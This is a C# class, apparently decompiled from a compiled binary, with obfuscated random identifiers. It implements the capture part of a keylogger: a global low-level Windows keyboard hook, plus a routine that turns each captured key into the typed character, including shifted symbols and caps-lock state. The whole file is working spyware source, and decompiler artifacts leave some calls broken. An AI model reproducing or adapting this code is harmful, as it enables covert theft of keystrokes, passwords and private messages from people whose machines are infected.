using System;
using System.Reflection;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using System.Windows.Forms;

public class EQeMdPTsheYqnLg
{
	private struct KBDLLHOOKSTRUCT
	{
		public int vkCode;

		public int scancode;

		public int flags;

		public int time;

		public int dwExtraInfo;
	}

	private delegate int KeyboardProcDelegate(int nCode, int wParam, ref KBDLLHOOKSTRUCT lParam);

	public delegate void KeyDownEventHandler(Keys Key);

	public delegate void KeyUpEventHandler(Keys Key);

	public delegate void CtrlAltDeleteEventHandler();

	private const int HC_ACTION = 0;

	private const int WH_KEYBOARD_LL = 13;

	private const int WM_KEYDOWN = 256;

	private const int WM_KEYUP = 257;

	private const int WM_SYSKEYDOWN = 260;

	private const int WM_SYSKEYUP = 261;

	private static KeyDownEventHandler KeyDownEvent;

	private static KeyUpEventHandler KeyUpEvent;

	private static CtrlAltDeleteEventHandler CtrlAltDeleteEvent;

	private static int KeyHook;

	private static KeyboardProcDelegate KeyHookDelegate;

	public static event KeyDownEventHandler KeyDown
	{
		[MethodImpl(MethodImplOptions.Synchronized)]
		add
		{
			KeyDownEvent = (KeyDownEventHandler)Delegate.Combine(KeyDownEvent, value);
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		remove
		{
			KeyDownEvent = (KeyDownEventHandler)Delegate.Remove(KeyDownEvent, value);
		}
	}

	public static event KeyUpEventHandler KeyUp
	{
		[MethodImpl(MethodImplOptions.Synchronized)]
		add
		{
			KeyUpEvent = (KeyUpEventHandler)Delegate.Combine(KeyUpEvent, value);
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		remove
		{
			KeyUpEvent = (KeyUpEventHandler)Delegate.Remove(KeyUpEvent, value);
		}
	}

	public static event CtrlAltDeleteEventHandler CtrlAltDelete
	{
		[MethodImpl(MethodImplOptions.Synchronized)]
		add
		{
			CtrlAltDeleteEvent = (CtrlAltDeleteEventHandler)Delegate.Combine(CtrlAltDeleteEvent, value);
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		remove
		{
			CtrlAltDeleteEvent = (CtrlAltDeleteEventHandler)Delegate.Remove(CtrlAltDeleteEvent, value);
		}
	}

	[DllImport("user32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	private static extern int SetWindowsHookExA(int idHook, KeyboardProcDelegate lpfn, int hmod, int dwThreadId);

	[DllImport("user32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	private static extern int CallNextHookEx(int hHook, int nCode, int wParam, KBDLLHOOKSTRUCT lParam);

	[DllImport("user32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	private static extern int UnhookWindowsHookEx(int hHook);

	public void FLHTWkGIRbWyPhC()
	{
		KeyHookDelegate = KeyboardProc;
		KeyHook = SetWindowsHookExA(13, KeyHookDelegate, Marshal.GetHINSTANCE(Assembly.GetExecutingAssembly().GetModules()[0]).ToInt32(), 0);
	}

	private int KeyboardProc(int nCode, int wParam, ref KBDLLHOOKSTRUCT lParam)
	{
		if (nCode == 0)
		{
			switch (wParam)
			{
			case 256:
			case 260:
				KeyDownEvent?.Invoke((Keys)lParam.vkCode);
				break;
			case 257:
			case 261:
				KeyUpEvent?.Invoke((Keys)lParam.vkCode);
				break;
			}
		}
		return CallNextHookEx(KeyHook, nCode, wParam, lParam);
	}

	public void Unhook()
	{
		UnhookWindowsHookEx(KeyHook);
		base.Finalize();
	}

	public string VPFkttsxibiNaZp(Keys eCode)
	{
		//IL_0000: Unknown result type (might be due to invalid IL or missing references)
		//IL_0001: Unknown result type (might be due to invalid IL or missing references)
		//IL_0002: Unknown result type (might be due to invalid IL or missing references)
		//IL_0005: Invalid comparison between Unknown and I4
		//IL_0007: Unknown result type (might be due to invalid IL or missing references)
		//IL_000a: Invalid comparison between Unknown and I4
		//IL_0015: Unknown result type (might be due to invalid IL or missing references)
		//IL_0026: Unknown result type (might be due to invalid IL or missing references)
		//IL_0030: Unknown result type (might be due to invalid IL or missing references)
		//IL_0032: Invalid comparison between Unknown and I4
		//IL_0034: Unknown result type (might be due to invalid IL or missing references)
		//IL_0045: Unknown result type (might be due to invalid IL or missing references)
		//IL_005b: Unknown result type (might be due to invalid IL or missing references)
		//IL_005e: Invalid comparison between Unknown and I4
		//IL_0063: Unknown result type (might be due to invalid IL or missing references)
		//IL_0066: Invalid comparison between Unknown and I4
		//IL_006b: Unknown result type (might be due to invalid IL or missing references)
		//IL_0075: Unknown result type (might be due to invalid IL or missing references)
		//IL_0077: Invalid comparison between Unknown and I4
		//IL_007c: Unknown result type (might be due to invalid IL or missing references)
		//IL_019a: Unknown result type (might be due to invalid IL or missing references)
		//IL_01be: Unknown result type (might be due to invalid IL or missing references)
		//IL_01c1: Invalid comparison between Unknown and I4
		//IL_01c3: Unknown result type (might be due to invalid IL or missing references)
		//IL_01c6: Invalid comparison between Unknown and I4
		//IL_01c8: Unknown result type (might be due to invalid IL or missing references)
		//IL_01ec: Unknown result type (might be due to invalid IL or missing references)
		//IL_01ef: Invalid comparison between Unknown and I4
		//IL_01f4: Unknown result type (might be due to invalid IL or missing references)
		//IL_01f7: Invalid comparison between Unknown and I4
		//IL_01fc: Unknown result type (might be due to invalid IL or missing references)
		//IL_0293: Unknown result type (might be due to invalid IL or missing references)
		//IL_0296: Invalid comparison between Unknown and I4
		//IL_02a3: Unknown result type (might be due to invalid IL or missing references)
		//IL_02a9: Invalid comparison between Unknown and I4
		//IL_02ae: Unknown result type (might be due to invalid IL or missing references)
		//IL_02b4: Invalid comparison between Unknown and I4
		//IL_02b9: Unknown result type (might be due to invalid IL or missing references)
		//IL_02c3: Unknown result type (might be due to invalid IL or missing references)
		//IL_02c5: Invalid comparison between Unknown and I4
		//IL_02ca: Unknown result type (might be due to invalid IL or missing references)
		//IL_0403: Unknown result type (might be due to invalid IL or missing references)
		//IL_0531: Unknown result type (might be due to invalid IL or missing references)
		//IL_0534: Invalid comparison between Unknown and I4
		//IL_0543: Unknown result type (might be due to invalid IL or missing references)
		if ((int)eCode >= 65 && (int)eCode <= 90)
		{
			if (Control.IsKeyLocked((Keys)20))
			{
				return ((Enum)eCode).ToString();
			}
			if ((Control.get_ModifierKeys() & 0x10000) != 0)
			{
				return ((Enum)eCode).ToString();
			}
			return ((Enum)eCode).ToString().ToLower();
		}
		if ((int)eCode >= 48 && (int)eCode <= 57)
		{
			if ((Control.get_ModifierKeys() & 0x10000) == 0)
			{
				string text = ((Enum)eCode).ToString();
				return text.Replace("D", "");
			}
			switch (((Enum)eCode).ToString())
			{
			case "D1":
				return "!";
			case "D2":
				return "@";
			case "D3":
				return "#";
			case "D4":
				return "$";
			case "D5":
				return "%";
			case "D6":
				return "^";
			case "D7":
				return "&";
			case "D8":
				return "*";
			case "D9":
				return "(";
			case "D0":
				return ")";
			}
		}
		else
		{
			if ((int)eCode >= 96 && (int)eCode <= 105)
			{
				string text2 = ((Enum)eCode).ToString();
				return text2.Replace("NumPad", "");
			}
			if ((int)eCode >= 106 && (int)eCode <= 111)
			{
				switch (((Enum)eCode).ToString())
				{
				case "Divide":
					return "/";
				case "Multiply":
					return "*";
				case "Subtract":
					return "-";
				case "Add":
					return "+";
				case "Decimal":
					return ".";
				}
			}
			else
			{
				if ((int)eCode == 32)
				{
					return " ";
				}
				if ((int)eCode < 186 || (int)eCode > 222)
				{
					if ((int)eCode == 13)
					{
						return "\r\n";
					}
					return "<" + ((Enum)eCode).ToString() + ">";
				}
				if ((Control.get_ModifierKeys() & 0x10000) != 0)
				{
					switch (((Enum)eCode).ToString())
					{
					case "OemMinus":
						return "_";
					case "Oemplus":
						return "+";
					case "OemOpenBrackets":
						return "{";
					case "Oem6":
						return "}";
					case "Oem5":
						return "|";
					case "Oem1":
						return ":";
					case "Oem7":
						return "\"";
					case "Oemcomma":
						return "<";
					case "OemPeriod":
						return ">";
					case "OemQuestion":
						return "?";
					case "Oemtilde":
						return "~";
					}
				}
				else
				{
					switch (((Enum)eCode).ToString())
					{
					case "OemMinus":
						return "-";
					case "Oemplus":
						return "=";
					case "OemOpenBrackets":
						return "[";
					case "Oem6":
						return "]";
					case "Oem5":
						return "\\";
					case "Oem1":
						return ";";
					case "Oem7":
						return "'";
					case "Oemcomma":
						return ",";
					case "OemPeriod":
						return ".";
					case "OemQuestion":
						return "/";
					case "Oemtilde":
						return "`";
					}
				}
			}
		}
		return null;
	}
}
